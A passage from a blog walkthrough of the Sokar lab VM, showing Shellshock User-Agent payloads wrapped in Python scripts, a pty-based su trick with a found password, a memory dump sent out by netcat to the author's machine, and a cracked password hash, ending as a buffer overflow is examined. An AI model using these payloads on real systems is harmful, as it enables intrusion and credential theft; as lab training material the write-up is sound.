&lt;p&gt;With the file transfer script done, I coded up a small &amp;lsquo;port scanner&amp;rsquo; (though all it really does is try to connect to a port and move on to the next within 0.1s):&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/python

# Sokar Egress Port Scanner
# 2015 Leon Jacobs

import socket

for port in xrange(1, 65535):

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(0.1)
    print &amp;quot;Trying port %d&amp;quot; % port
    sock.connect_ex((&amp;quot;192.168.217.174&amp;quot;, port))
    sock.close()

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&amp;hellip; and transferred it to Sokar using my &lt;code&gt;transfer.py&lt;/code&gt; script:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar $ python transfer.py port_scan.py /tmp/port_scan.py
 * Starting transfer of local &#39;port_scan.py&#39; to remote &#39;/tmp/port_scan.py&#39;
 * Temp file on remote will be: /tmp/cf8ca858a40ecf06741824362c37df.txt
 * Transferring 10 chunks to /tmp/cf8ca858a40ecf06741824362c37df.txt
 * Chunk 1/10 transferred
 * Chunk 2/10 transferred
 * Chunk 3/10 transferred
 * Chunk 4/10 transferred
 * Chunk 5/10 transferred
 * Chunk 6/10 transferred
 * Chunk 7/10 transferred
 * Chunk 8/10 transferred
 * Chunk 9/10 transferred
 * Chunk 10/10 transferred
 * Decoding hex on remote
 * Cleaning up temp file /tmp/cf8ca858a40ecf06741824362c37df.txt
 * Local &#39;port_scan.py&#39; transferred to remote &#39;/tmp/port_scan.py&#39;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I also opened up a &lt;code&gt;tcpdump&lt;/code&gt; on my local Kali Linux VM, filtering out &lt;code&gt;tcp/591&lt;/code&gt; as well as &lt;code&gt;arp&lt;/code&gt; traffic:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar $ tcpdump -i eth1 not arp and not port 591
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth1, link-type EN10MB (Ethernet), capture size 65535 bytes

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Finally, I fired the scanner off using the previously developed &lt;code&gt;shock.py&lt;/code&gt; script:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar $ python shock.py &amp;quot;/usr/bin/python /tmp/port_scan.py&amp;quot;
 * Executing /usr/bin/python /tmp/port_scan.py

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I waited&amp;hellip; a really long time. I know poking at 65535 ports takes quite some time too so off I went to do other things. After quite some time, I returned to Sokar, to find that the &lt;code&gt;tcpdump&lt;/code&gt; had no responses. I fiddled around with the scripts to check that I did not make a mistake but eventually I had to come to the conclusion that all outbound traffic is being filtered. Drat.&lt;/p&gt;

&lt;h2 id=&#34;bynarr-the-fruit&#34;&gt;bynarr the fruit&lt;/h2&gt;

&lt;p&gt;Not having an interactive shell was not the end of the world. Instead of fussing about that I decided to move on to poking around some more. Enumeration revealed that &lt;code&gt;/home/bynarr&lt;/code&gt; was readable to me. In there was what looked like a kernel module &lt;code&gt;lime.ko&lt;/code&gt; and a script called &lt;code&gt;lime&lt;/code&gt; to &lt;code&gt;insmod&lt;/code&gt; it. Both were owned by root:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar $ python shock.py &amp;quot;/bin/cat /home/bynarr/lime&amp;quot;
 * Executing /bin/cat /home/bynarr/lime

#!/bin/bash
echo &amp;quot;&amp;quot;&amp;quot;
==========================
Linux Memory Extractorator
==========================
&amp;quot;
echo &amp;quot;LKM, add or remove?&amp;quot;
echo -en &amp;quot;&amp;gt; &amp;quot;

read -e input

if [ $input == &amp;quot;add&amp;quot; ]; then

    /sbin/insmod /home/bynarr/lime.ko &amp;quot;path=/tmp/ram format=raw&amp;quot;

elif [ $input == &amp;quot;remove&amp;quot; ]; then

    /sbin/rmmod lime

else

    echo &amp;quot;Invalid input, burn in the fires of Netu!&amp;quot;

fi

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I knew that the chances were slim that it would allow me to run &lt;code&gt;insmod&lt;/code&gt; as &lt;code&gt;apache&lt;/code&gt;, but ofc I tried running the script regardless. Due to the fact that the file called &lt;code&gt;/tmp/ram&lt;/code&gt; was not created after running &lt;code&gt;python shock.py &amp;quot;echo \&amp;quot;add\&amp;quot; | /home/bynarr/lime&amp;quot;&lt;/code&gt;, I assumed it failed.&lt;/p&gt;

&lt;p&gt;Later, some more enumeration finally got me to &lt;code&gt;/var/spool/mail/bynarr&lt;/code&gt; with a message with the following contents:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;leonjza@kali/sokar $ python shock.py &amp;quot;/bin/cat /var/spool/mail/bynarr&amp;quot;
 * Executing /bin/cat /var/spool/mail/bynarr

Return-Path: &amp;lt;root@sokar&amp;gt;
Delivered-To: bynarr@localhost
Received:  from root by localhost
To: &amp;lt;bynarr@sokar&amp;gt;
Date: Thu, 13 Nov 2014 22:04:31 +0100
Subject: Welcome

Dear Bynarr.  Welcome to Sokar Inc. Forensic Development Team.
A user account has been setup for you.

UID 500 (bynarr)
GID 500 (bynarr)
    501 (forensic)

Password &#39;fruity&#39;.  Please change this ASAP.
Should you require, you&#39;ve been granted outbound ephemeral port access on 51242, to transfer non-sensitive forensic dumps out for analysis.

All the best in your new role!

  -Sokar-
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I confirmed that &lt;code&gt;bynarr&lt;/code&gt; was in the groups mentioned in the mail:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar $ python shock.py &amp;quot;/usr/bin/id bynarr&amp;quot;
 * Executing /usr/bin/id bynarr

uid=500(bynarr) gid=501(bynarr) groups=501(bynarr),500(forensic)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;What confused me here was the mention of &lt;em&gt;&amp;ldquo;outbound ephemeral port access on 51242&amp;rdquo;&lt;/em&gt;. I reduced my port scanners range to only scan from 51240 to 51250 to confirm this. I transferred the updated port scanner to Sokar, opened up a new &lt;code&gt;tcpdump&lt;/code&gt; session and waited anxiously. &lt;code&gt;tcp/51242&lt;/code&gt; outbound still appeared to be closed.&lt;/p&gt;

&lt;p&gt;Of course, the most valuable piece of information was definitely the password &lt;em&gt;fruity&lt;/em&gt;. Now, remember, I have a limited shell. Not a interactive one. I have been interfacing with Sokar only via python scripts which are executing commands via Shellshock HTTP requests.&lt;/p&gt;

&lt;p&gt;Essentially, the easiest way for me to become &lt;code&gt;bynarr&lt;/code&gt; (assuming &lt;em&gt;fruity&lt;/em&gt; really is the password), would be to &lt;code&gt;su&lt;/code&gt; right? Sounds like a 2 sec job. Well, it wasn’t :( Instead, I got caught up in a whole bunch of interesting situations where &lt;code&gt;su&lt;/code&gt; expects a password via &lt;code&gt;stdin&lt;/code&gt;, requires a valid tty (which I don’t have) and will spawn a shell for me to interact with (which I can&amp;rsquo;t). Quite some time later, I got closer to becoming &lt;code&gt;bynarr&lt;/code&gt; with something like &lt;code&gt;echo fruity | su bynarr&lt;/code&gt;. To add to the pain, my shellshock shell also did not have a proper environment, so I had to prefix most commands with their full paths. Luckily though &lt;code&gt;$(which id)&lt;/code&gt; came in very handy and saved some time. In retrospect, I could have probably just exported &lt;code&gt;PATH&lt;/code&gt; as required, but heh.&lt;/p&gt;

&lt;p&gt;Fast forward some time, I came across &lt;a href=&#34;http://pen-testing.sans.org/blog/2014/07/08/sneaky-stealthy-su-in-web-shells&#34;&gt;this&lt;/a&gt; SANS blogpost, which details on the topic of some &amp;lsquo;stealthy&amp;rsquo; su shells. Most importantly, the example of &lt;code&gt;(sleep 1; echo password) | python -c &amp;quot;import pty; pty.spawn([&#39;/bin/su&#39;,&#39;-c&#39;,&#39;whoami&#39;]);&amp;quot;&lt;/code&gt; got me the closest to &lt;code&gt;bynarr&lt;/code&gt;. Toying around with this a little, I realized that for some reason, the &lt;code&gt;(&lt;/code&gt; and &lt;code&gt;)&lt;/code&gt; characters were messing around, so I replaced that section with some python too. After a whole bunch attempts, I eventually got this to work:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;/usr/bin/python -c &amp;quot;import time; time.sleep(1); print &#39;fruity&#39;&amp;quot; | /usr/bin/python -c &amp;quot;import pty; pty.spawn([&#39;/bin/su&#39;,&#39;-c&#39;,&#39;id&#39;, &#39;bynarr&#39;]);&amp;quot;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;(Basically, spawn a tty; attempt to &lt;code&gt;su&lt;/code&gt; specifying the command to run with &lt;code&gt;-c&lt;/code&gt;, then 1 second later, echo &lt;code&gt;fruity&lt;/code&gt; to the &lt;em&gt;Password&lt;/em&gt; prompt and execute &lt;code&gt;id&lt;/code&gt; as &lt;code&gt;bynarr&lt;/code&gt;)&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar $ python shock.py &amp;quot;/usr/bin/python -c \&amp;quot;import time; time.sleep(1); print &#39;fruity&#39;\&amp;quot; | /usr/bin/python -c \&amp;quot;import pty; pty.spawn([&#39;/bin/su&#39;,&#39;-c&#39;,&#39;id&#39;, &#39;bynarr&#39;]);\&amp;quot;&amp;quot;
 * Executing /usr/bin/python -c &amp;quot;import time; time.sleep(1); print &#39;fruity&#39;&amp;quot; | /usr/bin/python -c &amp;quot;import pty; pty.spawn([&#39;/bin/su&#39;,&#39;-c&#39;,&#39;id&#39;, &#39;bynarr&#39;]);&amp;quot;

Password:
uid=500(bynarr) gid=501(bynarr) groups=501(bynarr),500(forensic)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;:D As this is actually a Shellshock request, the full &lt;code&gt;User-Agent&lt;/code&gt; header therefore was:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;() { :;};echo;/usr/bin/python -c &amp;quot;import time; time.sleep(1); print &#39;fruity&#39;&amp;quot; | /usr/bin/python -c &amp;quot;import pty; pty.spawn([&#39;/bin/su&#39;,&#39;-c&#39;,&#39;id&#39;, &#39;bynarr&#39;]);&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Again, constructing that every time I want to execute something as &lt;code&gt;bynarr&lt;/code&gt; would have been le-suck, so I made another wrapper script:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/python

# Sokar &#39;bynarr&#39; command execution
# 2015 Leon Jacobs

import requests
import sys

if len(sys.argv) &amp;lt; 2:

    print &amp;quot; * Usage %s &amp;lt;cmd&amp;gt;&amp;quot; % sys.argv[0]
    sys.exit(1)

command = sys.argv[1].strip()
payload = &amp;quot;&amp;quot;&amp;quot;/usr/bin/python -c &amp;quot;import time; time.sleep(1); print &#39;fruity&#39;&amp;quot; | /usr/bin/python -c &amp;quot;import pty; pty.spawn([&#39;/bin/su&#39;,&#39;-c&#39;,&#39;%s&#39;, &#39;bynarr&#39;]);&amp;quot; &amp;quot;&amp;quot;&amp;quot; % command
print &amp;quot; * Executing %s\n&amp;quot; % payload

# prepare the sploit header
headers = { &amp;quot;User-Agent&amp;quot;: &amp;quot;() { :;};echo;%s&amp;quot; % payload }
print requests.get(&amp;quot;http://192.168.217.163:591/cgi-bin/cat&amp;quot;, headers=headers).text.strip()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;All I have to do to get the output of &lt;code&gt;id&lt;/code&gt; is provide it as a argument to &lt;code&gt;bynarr.py&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar $ python bynarr.py &amp;quot;id&amp;quot;
 * Executing /usr/bin/python -c &amp;quot;import time; time.sleep(1); print &#39;fruity&#39;&amp;quot; | /usr/bin/python -c &amp;quot;import pty; pty.spawn([&#39;/bin/su&#39;,&#39;-c&#39;,&#39;id&#39;, &#39;bynarr&#39;]);&amp;quot;

Password:
uid=500(bynarr) gid=501(bynarr) groups=501(bynarr),500(forensic)
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;the-scary-linux-memory-extractor&#34;&gt;the scary linux memory extractor&lt;/h2&gt;

&lt;p&gt;With command access as &lt;code&gt;bynarr&lt;/code&gt; and remembering the mention of &lt;code&gt;tcp/51242&lt;/code&gt; outbound connectivity, I once more try and run the port scanner that got copied to &lt;code&gt;/tmp&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar $ python bynarr.py &amp;quot;/usr/bin/python /tmp/port_scan.py&amp;quot;
 * Executing /usr/bin/python -c &amp;quot;import time; time.sleep(1); print &#39;fruity&#39;&amp;quot; | /usr/bin/python -c &amp;quot;import pty; pty.spawn([&#39;/bin/su&#39;,&#39;-c&#39;,&#39;/usr/bin/python /tmp/port_scan.py&#39;, &#39;bynarr&#39;]);&amp;quot;

Password:
Trying port 51240
Trying port 51241
Trying port 51242
Trying port 51243
Trying port 51244
Trying port 51245
Trying port 51246
Trying port 51247
Trying port 51248
Trying port 51249
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Checking the &lt;code&gt;tcpdump&lt;/code&gt; output of this run&amp;hellip;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;leonjza@kali/sokar $ tcpdump -i eth1 not arp and not port 591
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth1, link-type EN10MB (Ethernet), capture size 65535 bytes
07:33:43.178113 IP 192.168.217.163.40371 &amp;gt; 192.168.217.174.51242: Flags [S], seq 594732851, win 14600, options [mss 1460,sackOK,TS val 2274844 ecr 0,nop,wscale 4], length 0
07:33:43.178129 IP 192.168.217.174.51242 &amp;gt; 192.168.217.163.40371: Flags [R.], seq 0, ack 594732852, win 0, length 0
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&amp;hellip; I finally see something coming out of Sokar!
So &lt;code&gt;bynarr&lt;/code&gt; is able to talk out on &lt;code&gt;tcp/51242&lt;/code&gt;. Wut. Taking a few moments to think about this, I remembered that &lt;code&gt;iptables&lt;/code&gt; is able to filter by user id using the &lt;code&gt;owner&lt;/code&gt; module. At this stage, this was the only thing that made sense why &lt;code&gt;apache&lt;/code&gt; would not be able to talk out on this port, but &lt;code&gt;bynarr&lt;/code&gt; can.&lt;/p&gt;

&lt;p&gt;So with that out the way, it was time to focus on this &lt;code&gt;lime&lt;/code&gt; thing. &lt;code&gt;bynarr&lt;/code&gt; was allowed to run &lt;code&gt;/home/bynarr/lime&lt;/code&gt; as root via &lt;code&gt;sudo&lt;/code&gt; without a password (as I suspected for the &lt;code&gt;insmod&lt;/code&gt;):&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar $ python bynarr.py &amp;quot;sudo -l&amp;quot;
 * Executing /usr/bin/python -c &amp;quot;import time; time.sleep(1); print &#39;fruity&#39;&amp;quot; | /usr/bin/python -c &amp;quot;import pty; pty.spawn([&#39;/bin/su&#39;,&#39;-c&#39;,&#39;sudo -l&#39;, &#39;bynarr&#39;]);&amp;quot;

Password:
Matching Defaults entries for bynarr on this host:
    !requiretty, visiblepw, always_set_home, env_reset, env_keep=&amp;quot;COLORS
    DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS&amp;quot;, env_keep+=&amp;quot;MAIL PS1
    PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE&amp;quot;, env_keep+=&amp;quot;LC_COLLATE
    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES&amp;quot;, env_keep+=&amp;quot;LC_MONETARY
    LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE&amp;quot;, env_keep+=&amp;quot;LC_TIME LC_ALL
    LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY&amp;quot;,
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User bynarr may run the following commands on this host:
    (ALL) NOPASSWD: /home/bynarr/lime
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I had no freaking idea what &lt;code&gt;lime&lt;/code&gt; even really is, so, to the Gooooogles I went and came across this: &lt;a href=&#34;https://github.com/504ensicsLabs/LiME&#34;&gt;https://github.com/504ensicsLabs/LiME&lt;/a&gt;. A forensics tool thingy thing. It seems like I will get to crawl through a dump of the current memory. Cool ;p&lt;/p&gt;

&lt;p&gt;I ran the script to &lt;code&gt;insmod&lt;/code&gt; the &lt;code&gt;lime.ko&lt;/code&gt;, this time with &lt;code&gt;sudo&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar $ python bynarr.py &amp;quot;echo \&amp;quot;add\&amp;quot; | sudo /home/bynarr/lime&amp;quot;
 * Executing /usr/bin/python -c &amp;quot;import time; time.sleep(1); print &#39;fruity&#39;&amp;quot; | /usr/bin/python -c &amp;quot;import pty; pty.spawn([&#39;/bin/su&#39;,&#39;-c&#39;,&#39;echo &amp;quot;add&amp;quot; | sudo /home/bynarr/lime&#39;, &#39;bynarr&#39;]);&amp;quot;

Password:

==========================
Linux Memory Extractorator
==========================

LKM, add or remove?
&amp;gt;

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I checked &lt;code&gt;/tmp&lt;/code&gt; for the existence of the &lt;code&gt;ram&lt;/code&gt; file and it was present. Looks like it worked :D. A quick note here. When I imported the VM initially, I upped the memory to 2GB. It was set to only have 256Mb by default which I thought was a little low. Sokar has limited disk space, so I was not getting the full memory dump. When I eventually noticed this, I reduced it back to the initial 256Mb and worked from there.&lt;/p&gt;

&lt;p&gt;Remembering the outbound port access, I opened a netcat listener on my local Kali linux to redirect a incoming file to a local &lt;code&gt;ram&lt;/code&gt; file with &lt;code&gt;nc -lvp 51242 &amp;gt; ram&lt;/code&gt;. Then, using my wrapper script &lt;code&gt;bynarr.py&lt;/code&gt; again, I redirected the &lt;code&gt;/tmp/ram&lt;/code&gt; file out over the netcat connection with: &lt;code&gt;python bynarr.py &amp;quot;/usr/bin/nc 192.168.217.174 51242 &amp;lt; /tmp/ram&amp;quot;&lt;/code&gt;. I now had a memory dump of Sokar on my local Kali Linux.&lt;/p&gt;

&lt;p&gt;It was at this stage that I went down the wrong rabbit hole. &lt;a href=&#34;https://code.google.com/p/volatility/&#34;&gt;Volatility&lt;/a&gt; was the first thing that came to mind when I saw this speak of memory dumps and what not. Having always just had this on my todo list, I figured that this was the perfect opportunity to finally give it a spin. I followed most of the docs to try and match the exact same kernel version as Sokar had (I have a number of CentOS VM&amp;rsquo;s) and prepared a profile as required. Short version, it failed. I was not able to get Volatility to give me anything useful. Eventually I reconsidered my approach and went back to trusty &amp;lsquo;ol &lt;code&gt;strings&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;I had to think a bit about what could possibly be useful in memory for me now. I noticed the user &lt;code&gt;apophis&lt;/code&gt; had a home directory that I have not yet been able to access, so I promptly grepped the ram image for this user:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar $ strings ram | grep apophis

[... snip ...]

apophis:[snip]0HQCZwUJ$rYYSk9SeqtbKv3aEe3kz/RQdpcka8K.2NGpPveVrE5qpkgSLTtE.Hvg0egWYcaeTYau11ahsRAWRDdT8jPltH.:16434:0:99999:7:::
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&amp;hellip; &lt;strong&gt;wut&lt;/strong&gt;. Why&amp;hellip; wait a sec. Why the heck is a password hash in memory now. Dont think there has been any activity for this user yet&amp;hellip; but clearly I don’t understand half of the technicalities here :( But hey. Lets run it through &lt;code&gt;john&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar $ john passwd --wordlist=/usr/share/wordlists/rockyou.txt
Warning: detected hash type &amp;quot;sha512crypt&amp;quot;, but the string is also recognized as &amp;quot;crypt&amp;quot;
Use the &amp;quot;--format=crypt&amp;quot; option to force loading these as that type instead
Loaded 1 password hash (sha512crypt [32/32])
overdrive        (apophis)
guesses: 1  time: 0:00:01:51 DONE (Sat Jan 31 20:35:42 2015)  c/s: 327  trying: parati - nicole28
Use the &amp;quot;--show&amp;quot; option to display all of the cracked passwords reliably
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;apophis:overdrive&lt;/code&gt;.&lt;/p&gt;

&lt;h2 id=&#34;build-the-clone-to-the-hook&#34;&gt;build the clone to the hook&lt;/h2&gt;

&lt;p&gt;To get command execution as &lt;code&gt;apophis.py&lt;/code&gt; I copied the &lt;code&gt;bynarr.py&lt;/code&gt; script to make &lt;code&gt;apophis.py&lt;/code&gt;, changing the username and the password.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar $ python apophis.py &amp;quot;id&amp;quot;
 * Executing /usr/bin/python -c &amp;quot;import time; time.sleep(2); print &#39;overdrive&#39;&amp;quot; | /usr/bin/python -c &amp;quot;import pty; pty.spawn([&#39;/bin/su&#39;, &#39;-l&#39;, &#39;-c&#39;,&#39;id&#39;, &#39;apophis&#39;]);&amp;quot;

Password:
uid=501(apophis) gid=502(apophis) groups=502(apophis)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;There we go! Command execution as &lt;code&gt;apophis&lt;/code&gt; :) In &lt;code&gt;/home/apophis&lt;/code&gt; there was a suid (for &lt;code&gt;root&lt;/code&gt;) binary called &lt;code&gt;build&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar $ python apophis.py &amp;quot;ls -lah /home/apophis&amp;quot;
 * Executing /usr/bin/python -c &amp;quot;import time; time.sleep(2); print &#39;overdrive&#39;&amp;quot; | /usr/bin/python -c &amp;quot;import pty; pty.spawn([&#39;/bin/su&#39;, &#39;-l&#39;, &#39;-c&#39;,&#39;ls -lah /home/apophis&#39;, &#39;apophis&#39;]);&amp;quot;

Password:
total 36K
drwx------  2 apophis apophis 4.0K Jan  2 20:12 .
drwxr-xr-x. 4 root    root    4.0K Dec 30 19:20 ..
-rw-------  1 apophis apophis    9 Feb  2 20:55 .bash_history
-rw-r--r--  1 apophis apophis   18 Feb 21  2013 .bash_logout
-rw-r--r--  1 apophis apophis  176 Feb 21  2013 .bash_profile
-rw-r--r--  1 apophis apophis  124 Feb 21  2013 .bashrc
-rwsr-sr-x  1 root    root    8.3K Jan  2 17:49 build
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I thought I would copy this &lt;code&gt;build&lt;/code&gt; binary off the box as I don’t exactly have a nice interactive shell to work with yet. &lt;code&gt;apophis&lt;/code&gt; was also not able to to connect via &lt;code&gt;tcp/51242&lt;/code&gt; outbound, which further confirmed my suspicions on the &lt;code&gt;user&lt;/code&gt; module being used in iptables. I copied the binary to &lt;code&gt;/tmp/build&lt;/code&gt; and pushed it out via netcat as &lt;code&gt;bynarr&lt;/code&gt; (using my helper script) towards my local Kali linux install. Finally I had &lt;code&gt;build&lt;/code&gt; locally to play with.&lt;/p&gt;

&lt;p&gt;I later noticed it was a 64bit binary, so I had to move it over to my 64bit install of Kali Linux to inspect further.
Running it asked you if you wanted to &amp;lsquo;build?&amp;rsquo;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar $ ./build
Build? (Y/N) Y
Cloning into &#39;/mnt/secret-project&#39;...
ssh: Could not resolve hostname sokar-dev:: Name or service not known
fatal: The remote end hung up unexpectedly
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;That looks very much like the output of a git clone attempt. Knowing what the binary expects now, I continued to run this on Sokar via my Shellshock wrapper for &lt;code&gt;apophis&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar $ python apophis.py &amp;quot;echo Y | /home/apophis/build&amp;quot;
 * Executing /usr/bin/python -c &amp;quot;import time; time.sleep(2); print &#39;overdrive&#39;&amp;quot; | /usr/bin/python -c &amp;quot;import pty; pty.spawn([&#39;/bin/su&#39;, &#39;-l&#39;, &#39;-c&#39;,&#39;echo Y | /home/apophis/build&#39;, &#39;apophis&#39;]);&amp;quot;

Password:
Cloning into &#39;/mnt/secret-project&#39;...
ssh: Could not resolve hostname sokar-dev: Temporary failure in name resolution
fatal: Could not read from remote repository.

Please make sure you have the correct access rights
and the repository exists.
Build? (Y/N)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The same hostname resolution failure occurred. Hmm. Thinking about this, it looks like it is trying to clone a repository (as root??) to &lt;code&gt;/mnt/secret-project&lt;/code&gt; from &lt;code&gt;sokar-dev&lt;/code&gt; which does not resolve.&lt;/p&gt;

&lt;h3 id=&#34;the-impossible-b0f&#34;&gt;the impossible b0f&lt;/h3&gt;

&lt;p&gt;I was very unsure about what the next move should be. Playing around some more with the binary, it appeared as though there may be a buffer overflow problem when providing a answer to &lt;code&gt;build.&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar $ ./build
Build? (Y/N) YY
*** buffer overflow detected ***: ./build terminated
======= Backtrace: =========
/lib/x86_64-linux-gnu/libc.so.6(__fortify_fail+0x37)[0x2b53e6df5fe7]
/lib/x86_64-linux-gnu/libc.so.6(+0xefea0)[0x2b53e6df4ea0]
/lib/x86_64-linux-gnu/libc.so.6(__gets_chk+0x195)[0x2b53e6df4df5]
./build(main+0xea)[0x2b53e68e29d9]
/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xfd)[0x2b53e6d23ead]
./build(+0x7d9)[0x2b53e68e27d9]
======= Memory map: ========
2b53e68e2000-2b53e68e3000 r-xp 00000000 fe:00 667555                     /root/sokar/build
2b53e68e3000-2b53e68e7000 rwxp 00000000 00:00 0
2b53e6900000-2b53e6902000 rwxp 00000000 00:00 0
2b53e6ae2000-2b53e6ae3000 rwxp 00000000 fe:00 667555                     /root/sokar/build
2b53e6ae3000-2b53e6b03000 r-xp 00000000 fe:00 532890                     /lib/x86_64-linux-gnu/ld-2.13.so
2b53e6d02000-2b53e6d03000 r-xp 0001f000 fe:00 532890                     /lib/x86_64-linux-gnu/ld-2.13.so
2b53e6d03000-2b53e6d04000 rwxp 00020000 fe:00 532890                     /lib/x86_64-linux-gnu/ld-2.13.so
2b53e6d04000-2b53e6d05000 rwxp 00000000 00:00 0
2b53e6d05000-2b53e6e87000 r-xp 00000000 fe:00 534538                     /lib/x86_64-linux-gnu/libc-2.13.so
2b53e6e87000-2b53e7087000 ---p 00182000 fe:00 534538                     /lib/x86_64-linux-gnu/libc-2.13.so
2b53e7087000-2b53e708b000 r-xp 00182000 fe:00 534538                     /lib/x86_64-linux-gnu/libc-2.13.so
2b53e708b000-2b53e708c000 rwxp 00186000 fe:00 534538                     /lib/x86_64-linux-gnu/libc-2.13.so
2b53e708c000-2b53e7091000 rwxp 00000000 00:00 0
2b53e7091000-2b53e70a6000 r-xp 00000000 fe:00 523276                     /lib/x86_64-linux-gnu/libgcc_s.so.1
2b53e70a6000-2b53e72a6000 ---p 00015000 fe:00 523276                     /lib/x86_64-linux-gnu/libgcc_s.so.1
2b53e72a6000-2b53e72a7000 rwxp 00015000 fe:00 523276                     /lib/x86_64-linux-gnu/libgcc_s.so.1
2b53e886b000-2b53e888c000 rwxp 00000000 00:00 0                          [heap]
7fff340b7000-7fff340d8000 rwxp 00000000 00:00 0                          [stack]
7fff341eb000-7fff341ed000 r-xp 00000000 00:00 0                          [vdso]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
[1]    18571 abort      ./build
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I slapped &lt;code&gt;build&lt;/code&gt; into &lt;code&gt;gdb&lt;/code&gt; to take a closer look at the potential overflow as well as the security features that &lt;code&gt;build&lt;/code&gt; has been compiled with:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar $ gdb -q ./build
Reading symbols from /root/sokar/build...(no debugging symbols found)...done.
gdb-peda$ checksec
CANARY    : ENABLED
FORTIFY   : ENABLED
NX        : disabled
PIE       : ENABLED
RELRO     : disabled
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;:O The &lt;code&gt;CANARY&lt;/code&gt; explains the failure in &lt;code&gt;__fortify_fail&lt;/code&gt;. Disassembly of the &lt;code&gt;main&lt;/code&gt; function reveals a call to &lt;code&gt;__gets_chk&lt;/code&gt; which is responsible for the canary validation:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;gdb-peda$ disass main
Dump of assembler code for function main:

 [... snip ...]

   0x00000000000009cc &amp;lt;+221&amp;gt;:   mov    esi,0x2
   0x00000000000009d1 &amp;lt;+226&amp;gt;:   mov    rdi,rbx
   0x00000000000009d4 &amp;lt;+229&amp;gt;:   call   0x760 &amp;lt;__gets_chk@plt&amp;gt;
   0x00000000000009d9 &amp;lt;+234&amp;gt;:   lea    rsi,[rbp-0x30]
   0x00000000000009dd &amp;lt;+238&amp;gt;:   mov    rdi,rbx
   0x00000000000009e0 &amp;lt;+241&amp;gt;:   call   0x790 &amp;lt;strcmp@plt&amp;gt;
   0x00000000000009e5 &amp;lt;+246&amp;gt;:   test   eax,eax

 [... snip ...]
&lt;/code&gt;&lt;/pre&gt;

